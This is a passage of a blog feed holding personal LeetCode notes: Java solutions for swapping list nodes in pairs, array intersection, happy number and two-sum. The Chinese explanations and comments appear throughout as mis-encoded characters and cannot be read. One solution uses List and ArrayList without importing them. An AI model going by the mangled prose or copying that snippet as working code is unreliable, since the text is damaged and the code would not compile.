href="https://leetcode.cn/problems/swap-nodes-in-pairs/description/">24. ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p><strong>æ³¨æ„åœ¨äº¤æ¢ä¹‹å‰è¦å…ˆå­˜å‚¨éœ€è¦çš„å€¼</strong></p><h6 id="é€’å½’"><a href="#é€’å½’" class="headerlink" title="é€’å½’"></a>é€’å½’</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="comment">//è¿›è¡Œé€’å½’</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//äº¤æ¢</span></span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="è™šæ‹Ÿå¤´èŠ‚ç‚¹"><a href="#è™šæ‹Ÿå¤´èŠ‚ç‚¹" class="headerlink" title="è™šæ‹Ÿå¤´èŠ‚ç‚¹"></a>è™šæ‹Ÿå¤´èŠ‚ç‚¹</h6><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/df4a92582bd1bc37e60fd7f3bd7916a4.png" alt="img"></p><p>æˆ‘ä»¬æƒ³å®ç°çš„æ˜¯1å’Œ2äº¤æ¢ï¼Œ3å’Œ 4äº¤æ¢ï¼Œæ­¤æ—¶å¾ˆéš¾ä¸æƒ³åˆ°å€Ÿç”¨ä¸­é—´å˜é‡å®ç°ï¼Œä¸ç”¨é€’å½’å®ç°ã€æ¯æ¬¡å•ç‹¬å¤„ç†å¤´èŠ‚ç‚¹ã€‘æ›´ä¼˜é›….<br>æ³¨æ„5åé¢æ˜¯ç©ºæŒ‡é’ˆå°±ä¸ç”¨äº¤æ¢<br>åˆ¤æ–­next.nextä¸ä¸ºç©ºæ˜¯ä¸ºäº†é˜²æ­¢ç©ºæŒ‡é’ˆå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (prev.next != <span class="literal">null</span> &amp;&amp; prev.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next.next; <span class="comment">// ç¼“å­˜ next</span></span><br><span class="line">      prev.next = head.next;          <span class="comment">// å°† prev çš„ next æ”¹ä¸º head çš„ next</span></span><br><span class="line">      head.next.next = head;          <span class="comment">// å°† head.next(prev.next) çš„nextï¼ŒæŒ‡å‘ head</span></span><br><span class="line">      head.next = temp;               <span class="comment">// å°†head çš„ next æ¥ä¸Šç¼“å­˜çš„temp</span></span><br><span class="line">      prev = head;                    <span class="comment">// æ­¥è¿›1ä½</span></span><br><span class="line">      head = head.next;               <span class="comment">// æ­¥è¿›1ä½</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x8</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x8/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x8/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†"><a href="#ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†" class="headerlink" title="ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†"></a>ä¸¤ä¸ªæ•°ç»„çš„äº¤é›†</h3><p>linkï¼š<a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. ä¸¤ä¸ªæ•°ç»„çš„äº¤é›† - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h4 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h4><p>é¦–å…ˆæƒ³åˆ°åˆå¹¶ä¸¤ä¸ªæ•°ç»„ï¼Œéå†æ‰¾é‡å¤é¡¹å­˜å‚¨åˆ°æ–°çš„æ•°ç»„ä¸­ä½†å…¶å®ç”¨HashSetæ˜¯æ›´åŠ æ–¹ä¾¿çš„,ã€HashSetä¸å­˜åœ¨é‡å¤æ•°æ®ã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20241012004357257.png" alt="image-20241012004357257"><br>**æ³¨æ„ï¼šä½¿ç”¨æ•°ç»„åšå“ˆå¸Œè¡¨çš„é¢˜ç›®éƒ½é™åˆ¶äº†å¤§å° ä¾‹å¦‚åªæœ‰å°å†™å­—æ¯æˆ–è€…æ•°å€¼å¤§å°åœ¨ã€0-1000ã€‘å†… **</p><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums1 == <span class="literal">null</span> || nums1.length == <span class="number">0</span> || nums2 == <span class="literal">null</span> || nums2.length == <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ›å»ºéœ€è¦çš„setè¡¨ set2ç”¨äºè¿”å›ç»“æœ</span></span><br><span class="line">        Set&lt;Integer&gt; set1 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        Set&lt;Integer&gt; set2 = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†æ•°ç»„1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1)  &#123;</span><br><span class="line">            set1.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//éå†ser1æ˜ å°„çš„å…ƒç´ åˆ¤æ–­å“ˆå¸Œè¡¨ä¸­æ˜¯å¦å­˜åœ¨å¯¹åº”å…ƒç´ </span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            <span class="keyword">if</span>(set1.contains(i)) &#123;</span><br><span class="line">                set2.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å°†ç»“æœé›†åˆè½¬æ¢ä¸ºæ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] result = <span class="keyword">new</span> <span class="title class_">int</span>[set2.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : set2) &#123;</span><br><span class="line">            result[k++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>æ›´é«˜çº§çš„å†™æ³• Java8å¼•å…¥çš„æµå¼APIï¼ˆStream APIï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">//å°†ç»“æœé›†åˆè½¬æ¢ä¸ºæ•°ç»„</span></span><br><span class="line"><span class="keyword">return</span> set2.stream().mapToInt(x -&gt; x).toArray();</span><br></pre></td></tr></table></figure><p>**<code>stream()</code>**ï¼šå°†é›†åˆè½¬æ¢ä¸ºæµå¯¹è±¡ï¼Œä¾¿äºå¯¹é›†åˆè¿›è¡Œé“¾å¼æ“ä½œ.<br>**<code>mapToInt(x -&gt; x)</code>**ï¼šå°†æµä¸­çš„æ¯ä¸ª <code>Integer</code> å…ƒç´ è½¬æ¢ä¸º <code>int</code> ç±»å‹ï¼ˆè‡ªåŠ¨æ‹†ç®±).<br>**<code>toArray()</code>**ï¼šå°†æµä¸­çš„å…ƒç´ æ”¶é›†ä¸ºä¸€ä¸ª <code>int[]</code> æ•°ç»„.</p><h5 id="Hashæ•°ç»„"><a href="#Hashæ•°ç»„" class="headerlink" title="Hashæ•°ç»„"></a>Hashæ•°ç»„</h5><p>æ€è·¯ç›¸åŒ åªä¸è¿‡åŠ äº†å¤§å°é™åˆ¶ä¹‹åå¯ä»¥ç”¨Hashæ•°ç»„è§£å†³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] intersection(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºéœ€è¦çš„ä¸¤ä¸ªæ•°ç»„  </span></span><br><span class="line">        <span class="type">int</span>[] hash1 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="type">int</span>[] hash2 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1002</span>];</span><br><span class="line">        <span class="comment">//åˆ†åˆ«éå†ä¸¤ä¸ªæ•°ç»„ å¯¹ç›¸åŒå…ƒç´ å‡ºç°æ¬¡æ•°è®¡æ•°</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums1) &#123;</span><br><span class="line">            hash1[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : nums2) &#123;</span><br><span class="line">            hash2[i]++;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//ç›¸åŒçš„ä¸‹æ ‡ä½ç½®éƒ½å¤§äº0 æ»¡è¶³</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1002</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span>(hash1[i] &gt; <span class="number">0</span> &amp;&amp; hash2[i] &gt; <span class="number">0</span>)</span><br><span class="line">            result.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//è½¬æ¢æˆæ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] finalArray = <span class="keyword">new</span> <span class="title class_">int</span>[result.size()];</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i : result) &#123;</span><br><span class="line">            finalArray[index++] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> finalArray;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><h3 id="å¿«ä¹æ•°"><a href="#å¿«ä¹æ•°" class="headerlink" title="å¿«ä¹æ•°"></a>å¿«ä¹æ•°</h3><p>linkï¼š<a href="https://leetcode.cn/problems/happy-number/description/">202. å¿«ä¹æ•° - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>èµ·åˆåˆ†æçš„æ—¶å€™è¢«å¡åœ¨äº†å¾ªç¯æ¡ä»¶å¤„ã€ğŸ˜“ã€‘ï¼Œé¦–å…ˆå¾—ä¸æ˜¯1ç„¶åä¸æ»¡è¶³å¿«ä¹æ•°æ¡ä»¶æœ€åä¸è¢«åŒ…å«åœ¨Hashsetä¸­.ã€æ˜¯çš„æ²¡é”™æ˜¯é«˜è´µçš„Hashsetï¼ˆbushiï¼‰ã€‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isHappy</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºæ‰€éœ€çš„setè¡¨</span></span><br><span class="line">        Set&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//å¾ªç¯åˆ¤æ–­ æŒ‰é™¤æ¯ä¸€ä½åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">1</span> &amp;&amp; !result.contains(n)) &#123;</span><br><span class="line">            result.add(n);</span><br><span class="line">            <span class="comment">//getNumberå‡½æ•°å•ç‹¬æ¨¡æ‹Ÿå®ç°</span></span><br><span class="line">            n = getNumber(n);</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">            <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getNumber</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//é€ä½è¿›è¡Œå¹³æ–¹æ±‚å’Œåˆ¤æ–­</span></span><br><span class="line">            <span class="keyword">while</span>(n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> n % <span class="number">10</span>;</span><br><span class="line">                res += tmp * tmp;</span><br><span class="line">                n = n / <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h6><p> <strong>æ‰€æœ‰ç”±æ­¤è§‚ä¹‹ï¼Œæ‰€æœ‰åˆ¤æ–­å…ƒç´ æ˜¯å¦å‡ºç°è¿‡çš„é¢˜ç›®éƒ½å¯ä»¥ç”¨å“ˆå¸Œæ³•è§£å†³.</strong><br><strong>ä¸€èˆ¬å“ˆå¸Œè¡¨éƒ½æ˜¯ç”¨æ¥å¿«é€Ÿåˆ¤æ–­ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°é›†åˆé‡Œ.</strong></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0x9</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x9/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x9/</url>
      
        <content type="html"><![CDATA[<h4 id="ä¸¤æ•°ä¹‹å’Œ"><a href="#ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="ä¸¤æ•°ä¹‹å’Œ"></a>ä¸¤æ•°ä¹‹å’Œ</h4><p>linkï¼š<a href="https://leetcode.cn/problems/two-sum/description/">1. ä¸¤æ•°ä¹‹å’Œ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>çœ‹åˆ°é¢˜ç›®æè¿°é¦–å…ˆæƒ³åˆ°ç”¨ä¸¤å±‚forå¾ªç¯è§£å†³é—®é¢˜.<br>åˆ†åˆ«ä»iä½ç½®å’Œj(i+1)ä½ç½®å¼€å§‹ç›¸åŠ éå†åˆ¤æ–­.<br><strong>æ³¨æ„ä¸è¶Šç•Œæ¡ä»¶</strong></p><h6 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//æˆ‘ä»¬è¦æ‰¾åˆ°2ä¸ªæ•°ä¹‹å’Œç­‰äºtarget</span></span><br><span class="line">        <span class="comment">//å³æˆ‘ä»¬éœ€è¦æ‰¾åˆ°nums[i] + nums[j] == targetï¼Œå¹¶ä¸”è¿”å›ä»–ä»¬çš„ä¸‹æ ‡ï¼ˆiå’Œjï¼‰ï¼Œå…¶ä¸­i != j</span></span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>]; <span class="comment">//å£°æ˜ä¸€ä¸ªå¤§å°ä¸º2çš„æ•°ç»„ç”¨æ¥ä¿å­˜ç»“æœ</span></span><br><span class="line">        <span class="comment">//æˆ‘ä»¬é€šè¿‡å¾ªç¯æ¥éå†æ‰€æœ‰çš„æ•°å­—</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;  <span class="comment">//ç”¨ä¸€ä¸ªå˜é‡nä¿å­˜numsçš„é•¿åº¦</span></span><br><span class="line">        <span class="comment">//iä¸ºç¬¬ä¸€ä¸ªæ•°çš„ä¸‹æ ‡ï¼Œnumsä¸€å…±æœ‰nä¸ªæ•°ï¼Œæ‰€ä»¥içš„å–å€¼èŒƒå›´æ˜¯[0, n-1]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="comment">//jä¸ºç¬¬äºŒä¸ªæ•°çš„ä¸‹æ ‡ã€‚</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="comment">//å¯¹äºæ¯ä¸ªæ•°nums[i]ï¼Œæˆ‘ä»¬éªŒè¯ä¸€éå…¶ä»–æ•°ï¼ˆnums[j]ï¼‰è·Ÿå®ƒçš„å’Œæ˜¯å¦ç­‰äºtarget</span></span><br><span class="line">                <span class="comment">//å¦‚æœæ»¡è¶³æ¡ä»¶</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="comment">//å°†ä¸‹æ ‡å†™å…¥è¿”å›å€¼æ•°ç»„é‡Œ</span></span><br><span class="line">                    ans[<span class="number">0</span>] = i;</span><br><span class="line">                    ans[<span class="number">1</span>] = j;</span><br><span class="line">                    <span class="comment">//è¿”å›</span></span><br><span class="line">                    <span class="keyword">return</span> ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//é»˜è®¤è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h6><p><strong>Tips</strong><br><strong>å½“æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªå…ƒç´ æ˜¯å¦å‡ºç°è¿‡æˆ–è€…ä¸€ä¸ªå…ƒç´ æ˜¯å¦åœ¨é›†åˆé‡Œæ—¶ï¼Œé¦–å…ˆè¦æƒ³åˆ°å“ˆå¸Œæ³•.</strong></p><p>ä¹‹å‰äº†è§£åˆ°å“ˆå¸Œæ•°ç»„çš„è¿ç”¨æ˜¯å—åˆ°å¤§å°çš„é™åˆ¶ï¼Œå¦‚æœå…ƒç´ è¿‡å°‘ä¼šæµªè´¹å†…å­˜ç©ºé—´.<br>setæ˜¯ä¸€ä¸ªé›†åˆï¼Œå­˜å‚¨çš„å…ƒç´ åªèƒ½æ˜¯ä¸€ä¸ªkey.æœ¬é¢˜ä¸ä»…è¦åˆ¤æ–­yæ˜¯å¦å­˜åœ¨è¿˜è¦è®°å½•yçš„ä½ç½®ï¼Œä¸é€‚ç”¨.</p><p>æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé›†åˆå­˜å‚¨æˆ‘ä»¬éå†çš„å…ƒç´ ï¼Œå¯¹åº”çš„keyå€¼å’Œvalueå€¼åˆ†åˆ«å­˜æ”¾å…ƒç´ å’Œä¸‹æ ‡.(HasMap)</p><h6 id="mapçš„ä½œç”¨"><a href="#mapçš„ä½œç”¨" class="headerlink" title="mapçš„ä½œç”¨"></a>mapçš„ä½œç”¨</h6><p>èµ·åˆ°å­˜å‚¨çš„ä½œç”¨ï¼Œå­˜å‚¨æˆ‘ä»¬éå†çš„æ•°ç»„æ•°æ®å…ƒç´ å’Œå¯¹åº”ä¸‹æ ‡.<br>éå†æ•°ç»„çš„æ—¶å€™åªéœ€è¦æŸ¥è¯¢æ˜¯å¦æœ‰ä¸å½“å‰å…ƒç´ åŒ¹é…çš„å…ƒç´ å³å¯.ã€åŒ¹é…è§„åˆ™target-key &#x3D;&#x3D; nownumberã€‘<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110249454.png" alt="image-20241014110249454"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110319990.png" alt="image-20241014110319990"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20241014110336307.png" alt="image-20241014110336307"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//åˆ›å»ºæœ€ç»ˆè¾“å‡ºçš„æ•°ç»„</span></span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="comment">//æ’é™¤ç‰¹æ®Šæƒ…å†µ</span></span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="literal">null</span> || nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//åˆ›å»ºéœ€è¦çš„Map</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> target - nums[i];</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(tmp)) &#123;</span><br><span class="line">                res[<span class="number">1</span>] = i;</span><br><span class="line">                res[<span class="number">0</span>] = map.get(tmp);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//è·å–keyå¯¹åº”çš„value</span></span><br><span class="line">            map.put(nums[i],i);</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashmap.get(Object key)</span><br><span class="line"><span class="comment">//getæ–¹æ³•è·å–æŒ‡å®škeyçš„value</span></span><br><span class="line">hashmap.putï¼ˆK keyï¼ŒV valueï¼‰</span><br><span class="line"><span class="comment">//å°†é”®å€¼å¯¹æ·»åŠ åˆ°HashMapä¸­</span></span><br></pre></td></tr></table></figure><h4 id="å››æ•°ä¹‹å’Œ"><a href="#å››æ•°ä¹‹å’Œ" class="headerlink" 